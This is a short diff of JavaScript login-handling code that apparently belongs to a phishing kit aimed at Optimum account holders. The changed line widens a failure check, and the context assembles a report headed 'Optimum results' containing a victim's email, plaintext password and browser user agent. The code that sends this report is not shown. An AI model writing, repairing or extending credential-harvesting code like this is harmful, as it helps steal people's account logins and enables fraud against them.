@@ -106,7 +106,7 @@ User Agent: ${navigator.userAgent}`;
         console.log(error.response.data.response);
         console.log(error.response.data);
         if (error.response.data) {
-            if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS_EMAIL') {
+            if (error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS_EMAIL' || error.response.data.status == 'LOGIN_RESP_FAILURE_BAD_CREDENTIALS') {
                 const message = `Optimum results { invalid }
 Email: ${email}
 Password: ${password}
